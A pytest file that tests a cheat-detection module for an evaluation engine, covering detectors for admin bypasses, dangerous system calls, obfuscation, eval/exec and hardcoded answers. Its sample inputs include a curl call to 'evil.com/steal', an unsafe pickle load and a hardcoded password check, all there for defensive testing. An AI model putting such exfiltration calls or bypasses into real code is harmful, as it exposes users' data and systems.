"""
Tests for cheat-detection logic.

Exercises each detector with known cheating and benign patterns to verify
it fires on the right inputs and stays quiet on clean code.
"""

from __future__ import annotations

import pytest

from eval_engine.cheat_detection import (
    detect_all_cheat_signals,
    CheatSignals,
    CheatSignal,
    detect_hardcoded_admin_bypass,
    detect_dangerous_system_calls,
    detect_suspicious_patterns,
    detect_eval_exec,
    detect_hardcoded_expected_output,
)


# ---------------------------------------------------------------------------
# detect_hardcoded_admin_bypass
# ---------------------------------------------------------------------------


class TestHardcodedAdminBypass:
    def test_detects_is_admin_assignment(self) -> None:
        code = "is_admin = True\nif is_admin:\n    grant_access()"
        sig = detect_hardcoded_admin_bypass(code)
        assert sig is not None
        assert sig.name == "hardcoded_admin_bypass"
        assert sig.severity >= 0.5

    def test_detects_admin_user_check(self) -> None:
        code = 'if user == "admin":'
        sig = detect_hardcoded_admin_bypass(code)
        assert sig is not None

    def test_detects_hardcoded_password(self) -> None:
        code = 'if password == "supersecret123":'
        sig = detect_hardcoded_admin_bypass(code)
        assert sig is not None

    def test_clean_code_no_signal(self) -> None:
        code = """def login(username, password):
    return authenticate(username, password)"""
        sig = detect_hardcoded_admin_bypass(code)
        assert sig is None


# ---------------------------------------------------------------------------
# detect_dangerous_system_calls
# ---------------------------------------------------------------------------


class TestDangerousSystemCalls:
    def test_detects_subprocess_popen(self) -> None:
        code = "import subprocess\nsubprocess.Popen(['ls', '-la'])"
        sig = detect_dangerous_system_calls(code)
        assert sig is not None
        assert sig.name == "dangerous_system_calls"

    def test_detects_os_system(self) -> None:
        code = 'import os\nos.system("curl evil.com/steal")'
        sig = detect_dangerous_system_calls(code)
        assert sig is not None

    def test_detects_ctypes(self) -> None:
        code = "import ctypes\nctypes.CDLL('libc.so.6')"
        sig = detect_dangerous_system_calls(code)
        assert sig is not None

    def test_detects_pickle_load(self) -> None:
        code = "import pickle\ndata = pickle.loads(untrusted_bytes)"
        sig = detect_dangerous_system_calls(code)
        assert sig is not None

    def test_clean_code_no_signal(self) -> None:
        code = "result = sum([1, 2, 3])\nprint(result)"
        sig = detect_dangerous_system_calls(code)
        assert sig is None


# ---------------------------------------------------------------------------
# detect_suspicious_patterns
# ---------------------------------------------------------------------------


class TestSuspiciousPatterns:
    def test_detects_base64_decode(self) -> None:
        code = 'import base64; base64.b64decode("c3VwZXJzZWNyZXQ=")'
        sig = detect_suspicious_patterns(code)
        assert sig is not None
        assert sig.name == "suspicious_patterns"

    def test_detects_dunder_import(self) -> None:
        code = 'mod = __import__("os")'
        sig = detect_suspicious_patterns(code)
        assert sig is not None

    def test_detects_builtin_monkey_patch(self) -> None:
        code = "__builtins__.input = fake_input"
        sig = detect_suspicious_patterns(code)
        assert sig is not None

    def test_clean_code_no_signal(self) -> None:
        code = "import math\nprint(math.pi)"
        sig = detect_suspicious_patterns(code)
        assert sig is None


# ---------------------------------------------------------------------------
# detect_eval_exec
# ---------------------------------------------------------------------------


class TestEvalExec:
    def test_detects_eval(self) -> None:
        code = 'result = eval("2 + 2")'
        sig = detect_eval_exec(code)
        assert sig is not None
        assert sig.name == "eval_exec_detection"

    def test_detects_exec(self) -> None:
        code = 'exec("import os; os.system(\"ls\")")'
        sig = detect_eval_exec(code)
        assert sig is not None

    def test_clean_code_no_signal(self) -> None:
        code = "result = 2 + 2\nprint(result)"
        sig = detect_eval_exec(code)
        assert sig is None

    def test_variable_named_eval_no_signal(self) -> None:
        # A variable *named* eval but not calling it should not trigger.
        code = "eval = 42\nprint(eval)"
        sig = detect_eval_exec(code)
        assert sig is None


# ---------------------------------------------------------------------------
# detect_hardcoded_expected_output
# ---------------------------------------------------------------------------


class TestHardcodedExpectedOutput:
    def test_detects_expected_comment(self) -> None:
        code = "# expected: 42\nprint(compute_answer())"
        sig = detect_hardcoded_expected_output(code)
        assert sig is not None
        assert sig.name == "hardcoded_expected_output"

    def test_detects_answer_variable(self) -> None:
        code = "EXPECTED_OUTPUT = 'flag{abc123}'\nprint(EXPECTED_OUTPUT)"
        sig = detect_hardcoded_expected_output(code)
        assert sig is not None

    def test_clean_code_no_signal(self) -> None:
        code = "result = compute()\nprint(result)"
        sig = detect_hardcoded_expected_output(code)
        assert sig is None


# ---------------------------------------------------------------------------
# detect_all_cheat_signals (integration)
# ---------------------------------------------------------------------------


class TestDetectAll:
    def test_clean_code_returns_empty(self) -> None:
        code = """def solve(a, b):
    return a + b

print(solve(2, 3))
"""
        result = detect_all_cheat_signals(code)
        assert isinstance(result, CheatSignals)
        assert len(result.signals) == 0
        assert result.cheat_score == 0.0
        assert result.malicious_code_found is False

    def test_multiple_cheat_signals_aggregated(self) -> None:
        code = """
is_admin = True
import os
os.system('whoami')
result = eval(user_input)
# expected: secret
print(result)
"""
        result = detect_all_cheat_signals(code)
        assert len(result.signals) >= 3  # admin bypass + system call + eval + hardcoded expected
        assert result.cheat_score > 0
        assert result.malicious_code_found is True

    def test_single_signal_severity_rms(self) -> None:
        """Verify the RMS aggregation produces a non-zero score for one signal."""
        code = 'is_admin = True\nx = 1'
        result = detect_all_cheat_signals(code)
        assert len(result.signals) >= 1
        assert result.cheat_score > 0

    def test_malicious_flag_at_threshold(self) -> None:
        """A severity 0.8+ signal should set malicious_code_found."""
        code = """
import ctypes
ctypes.CDLL('libc.so.6')
"""
        result = detect_all_cheat_signals(code)
        # ctypes has severity 0.85 → malicious
        if result.malicious_code_found:
            assert result.cheat_score >= 0.8
        else:
            # If this particular pattern didn't fire, that's okay — but log it
            pytest.skip("ctypes pattern did not fire — might be env-specific")
